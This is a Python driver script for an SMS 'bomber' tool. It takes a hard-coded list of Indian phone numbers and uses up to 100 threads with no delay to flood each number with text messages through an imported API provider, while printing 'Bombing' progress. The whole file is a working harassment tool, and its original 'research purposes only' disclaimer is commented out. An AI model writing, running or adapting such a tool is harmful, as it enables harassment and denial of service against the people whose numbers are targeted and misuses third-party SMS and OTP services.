import os
import sys
import time
import random
from api import APIProvider
from colorama import Fore, Style
from decorators import MessageDecorator
from concurrent.futures import ThreadPoolExecutor, as_completed

list = [112233445,442244] #Enter the numbers here
ASCII_MODE = False
ALL_COLORS = [Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.BLUE,
              Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
RESET_ALL = Style.RESET_ALL
def bann_text():
    clr()
    logo = """


   db    88     88         8888b.   dP"Yb  88b 88 888888 
  dPYb   88     88          8I  Yb dP   Yb 88Yb88 88__   
 dP__Yb  88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   
dP""'"Yb 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 


           _         __              
          /_|    /  (   _/  _  _   _ 
         (  | (_/  __)  /  (/ /  _)  
                                     
   """
    if ASCII_MODE:
        logo = ""
    
    print(random.choice(ALL_COLORS) + logo + RESET_ALL)
    print()

def clr():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
mesgdcrt = MessageDecorator("icon")
def pretty_print(cc, target, success, failed):
    requested = success+failed
    mesgdcrt.SectionMessage("Bombing is in progress - Please be patient")
    mesgdcrt.GeneralMessage(
        "Please stay connected to the internet during bombing")
    mesgdcrt.GeneralMessage("Target       : " + cc + " " + target)
    mesgdcrt.GeneralMessage("Sent         : " + str(requested))
    mesgdcrt.GeneralMessage("Successful   : " + str(success))
    mesgdcrt.GeneralMessage("Failed       : " + str(failed))


def workernode(mode, cc, target, count, delay, max_threads):

    api = APIProvider(cc, target, mode, delay=delay)
    clr()
    mesgdcrt.SectionMessage("Gearing up the Bomber - Please be patient")
    mesgdcrt.GeneralMessage(
        "Please stay connected to the internet during bombing")
    mesgdcrt.GeneralMessage("API Version   : " + api.api_version)
    mesgdcrt.GeneralMessage("Target        : " + cc + target)
    mesgdcrt.GeneralMessage("Amount        : " + str(count))
    mesgdcrt.GeneralMessage("Threads       : " + str(max_threads) + " threads")
    mesgdcrt.GeneralMessage("Delay         : " + str(delay) +
                            " seconds")
    # mesgdcrt.WarningMessage(
    #     "This tool was made for fun and research purposes only")
    # print()
    # input(mesgdcrt.CommandMessage(
    #     "Press [CTRL+Z] to suspend the bomber or [ENTER] to resume it"))

    if len(APIProvider.api_providers) == 0:
        mesgdcrt.FailureMessage("Your country/target is not supported yet")
        mesgdcrt.GeneralMessage("Feel free to reach out to us")
        input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
        bann_text()
        sys.exit()

    success, failed = 0, 0
    while success < count:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            jobs = []
            for i in range(count-success):
                jobs.append(executor.submit(api.hit))

            for job in as_completed(jobs):
                result = job.result()
                if result is None:
                    mesgdcrt.FailureMessage(
                        "Bombing limit for your target has been reached")
                    mesgdcrt.GeneralMessage("Try Again Later !!")
                    input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
                    bann_text()
                    sys.exit()
                if result:
                    success += 1
                else:
                    failed += 1
                clr()
                pretty_print(cc, target, success, failed)
    print("\n")
    mesgdcrt.SuccessMessage("Bombing completed!")

for i in list:

    cc = "91"
    target = str(i)
    mode = "sms"
    delay = 0
    count = 2
    max_threads = 100
    workernode(mode, cc, target, count, delay, max_threads)
time.sleep(1.5)
bann_text()
sys.exit()
